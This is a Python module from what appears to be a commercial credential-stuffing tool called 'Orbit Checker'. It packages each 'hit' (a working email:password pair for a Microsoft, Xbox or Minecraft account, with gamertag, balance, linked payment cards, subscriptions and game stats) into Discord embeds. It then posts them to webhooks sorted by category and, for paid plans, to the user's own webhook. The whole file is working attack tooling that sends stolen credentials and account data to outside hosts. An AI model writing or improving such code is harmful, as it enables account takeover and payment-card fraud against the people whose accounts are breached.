"""
Discord Webhook Integration
- Per-category webhooks (hits, XGPU, Minecraft, cards, admin)
- Rich embeds for each hit type
- Rate limit handling (429 retry)
- Async sending via aiohttp
- Per-user custom webhook support
"""
import asyncio
import logging
import time
from typing import Dict, Optional, List
from datetime import datetime

logger = logging.getLogger(__name__)

try:
    import aiohttp
    _HAS_AIOHTTP = True
except ImportError:
    _HAS_AIOHTTP = False


# Colour codes for embed types
_COLOURS = {
    'hit':       0x00FF9D,
    'xgpu':      0xFFD700,
    'xgp':       0x5865F2,
    'minecraft': 0x57F287
,
    'cards':     0xED4245,
    'twofa':     0xFEE75C,
    'admin':     0xEB459E,
    'info':      0x5865F2,
}


def _build_hit_embed(result: Dict, combo: str, session_id: str) -> Dict:
    """Build a rich Discord embed for a hit result."""
    status    = result.get('status', 'HIT')
    email     = result.get('email', '?')
    password  = result.get('password', '?')
    gamertag  = result.get('gamertag') or result.get('gamertag')
    has_xgpu  = result.get('xgp_type') == 'XGPU'
    has_xgp   = result.get('has_gamepass', False)
    has_mc    = result.get('has_mc', False) or result.get('has_minecraft', False)
    mc_user   = result.get('username') or result.get('mc_username')
    capes     = result.get('capes', []) or result.get('mc_capes', [])
    balance   = result.get('balance')
    rewards   = result.get('rewards_points')
    cards     = result.get('payment_methods', [])
    subs      = result.get('subscriptions', [])
    capture   = result.get('_capture_line', f'{email}:{password}')

    # Determine embed colour
    if has_xgpu:
        colour = _COLOURS['xgpu']
        title  = '⭐ XGPU Hit'
    elif has_xgp:
        colour = _COLOURS['xgp']
        title  = '🎮 Xbox Game Pass Hit'
    elif has_mc:
        colour = _COLOURS['minecraft']
        title  = '⛏️ Minecraft Hit'
    elif cards:
        colour = _COLOURS['cards']
        title  = '💳 Card Hit'
    else:
        colour = _COLOURS['hit']
        title  = '✅ Hit'

    fields = []

    if gamertag:
        fields.append({'name': '🎮 Gamertag', 'value': f'`{gamertag}`', 'inline': True})
    if has_xgpu:
        fields.append({'name': '⭐ Plan', 'value': 'Xbox Game Pass Ultimate', 'inline': True})
    elif has_xgp:
        fields.append({'name': '🎮 Plan', 'value': 'Xbox Game Pass (PC)', 'inline': True})
    if mc_user:
        fields.append({'name': '⛏️ MC Username', 'value': f'`{mc_user}`', 'inline': True})
    if capes:
        fields.append({'name': '🧣 Capes', 'value': ', '.join(capes[:5]), 'inline': True})
    if balance:
        fields.append({'name': '💰 Balance', 'value': f'`{balance}`', 'inline': True})
    if rewards:
        fields.append({'name': '🏆 Rewards', 'value': f'`{rewards} pts`', 'inline': True})
    if cards:
        card_list = '\n'.join(
            c['display'] if isinstance(c, dict) else str(c)
            for c in cards[:3]
        )
        fields.append({'name': '💳 Cards', 'value': f'```{card_list}```', 'inline': False})
    if subs:
        sub_list = '\n'.join(
            s['display'] if isinstance(s, dict) else str(s)
            for s in subs[:3]
        )
        fields.append({'name': '📦 Subscriptions', 'value': f'```{sub_list}```', 'inline': False})

    # Hypixel stats
    hyp = result.get('hypixel')
    if hyp:
        hyp_parts = []
        if hyp.get('level'):    hyp_parts.append(f"Lvl: {hyp['level']}")
        if hyp.get('bw_stars'): hyp_parts.append(f"BW: {hyp['bw_stars']}⭐")
        if hyp.get('sw_stars'): hyp_parts.append(f"SW: {hyp['sw_stars']}⭐")
        if hyp.get('sb_networth'): hyp_parts.append(f"NW: {hyp['sb_networth']}")
        if hyp_parts:
            fields.append({'name': '🌐 Hypixel', 'value': ' | '.join(hyp_parts), 'inline': False})

    fields.append({
        'name': '📋 Capture',
        'value': f'```{capture[:1000]}```',
        'inline': False,
    })

    return {
        'embeds': [{
            'title':       title,
            'color':       colour,
            'fields':      fields,
            'footer':      {'text': f'Orbit Checker • Session: {session_id[:8]}'},
            'timestamp':   datetime.utcnow().isoformat(),
        }]
    }


def _build_admin_embed(title: str, description: str, colour_key: str = 'admin') -> Dict:
    return {
        'embeds': [{
            'title':       title,
            'description': description,
            'color':       _COLOURS.get(colour_key, _COLOURS['admin']),
            'footer':      {'text': 'Orbit Checker Admin'},
            'timestamp':   datetime.utcnow().isoformat(),
        }]
    }


async def _post_webhook(url: str, payload: Dict, retries: int = 2) -> bool:
    """Send a webhook with rate limit handling."""
    if not _HAS_AIOHTTP or not url:
        return False
    for attempt in range(retries + 1):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 204:
                        return True
                    if r.status == 429:
                        data = await r.json()
                        retry_after = data.get('retry_after', 1.0)
                        await asyncio.sleep(float(retry_after))
                        continue
                    if r.status >= 400:
                        logger.debug(f"Webhook {r.status}: {await r.text()}")
                        return False
        except Exception as exc:
            logger.debug(f"Webhook send error: {exc}")
            if attempt < retries:
                await asyncio.sleep(0.5)
    return False


class DiscordWebhookManager:
    """Manages Discord webhook sending with category routing."""

    def __init__(self):
        from core.config import (
            DISCORD_WEBHOOK_HITS, DISCORD_WEBHOOK_XGPU,
            DISCORD_WEBHOOK_MINECRAFT, DISCORD_WEBHOOK_CARDS,
            DISCORD_WEBHOOK_ADMIN,
        )
        self.webhooks = {
            'hits':      DISCORD_WEBHOOK_HITS,
            'xgpu':      DISCORD_WEBHOOK_XGPU,
            'minecraft': DISCORD_WEBHOOK_MINECRAFT,
            'cards':     DISCORD_WEBHOOK_CARDS,
            'admin':     DISCORD_WEBHOOK_ADMIN,
        }

    async def send_hit(self, result: Dict, session_id: str,
                       custom_webhook: str = '', plan: str = 'free'):
        """Route hit to appropriate webhook channel."""
        combo    = f"{result.get('email','?')}:{result.get('password','?')}"
        payload  = _build_hit_embed(result, combo, session_id)

        targets: List[str] = []

        # Global webhooks by category
        if result.get('xgp_type') == 'XGPU' and self.webhooks['xgpu']:
            targets.append(self.webhooks['xgpu'])
        elif (result.get('has_mc') or result.get('has_minecraft')) and self.webhooks['minecraft']:
            targets.append(self.webhooks['minecraft'])
        elif result.get('payment_methods') and self.webhooks['cards']:
            targets.append(self.webhooks['cards'])
        elif self.webhooks['hits']:
            targets.append(self.webhooks['hits'])

        # User's personal webhook (monthly/yearly only)
        if custom_webhook and plan in ('monthly', 'yearly'):
            targets.append(custom_webhook)

        for url in targets:
            if url:
                asyncio.create_task(_post_webhook(url, payload))

    async def send_admin(self, title: str, description: str):
        if self.webhooks['admin']:
            payload = _build_admin_embed(title, description)
            await _post_webhook(self.webhooks['admin'], payload)

    async def notify_scan_complete(self, user_id: int, session_id: str,
                                   stats: Dict, plan: str):
        if not self.webhooks['admin']:
            return
        hits     = stats.get('hits', 0)
        checked  = stats.get('checked', 0)
        rate     = (hits / max(checked, 1)) * 100
        desc = (
            f"**User:** `{user_id}`\n"
            f"**Session:** `{session_id[:8]}`\n"
            f"**Plan:** {plan}\n"
            f"**Checked:** {checked:,}\n"
            f"**Hits:** {hits:,} ({rate:.1f}%)\n"
            f"**CPM:** {stats.get('cpm', 0)}\n"
            f"**Mode:** {stats.get('mode', '?')}"
        )
        await self.send_admin('✅ Scan Complete', desc)


discord_manager = DiscordWebhookManager()
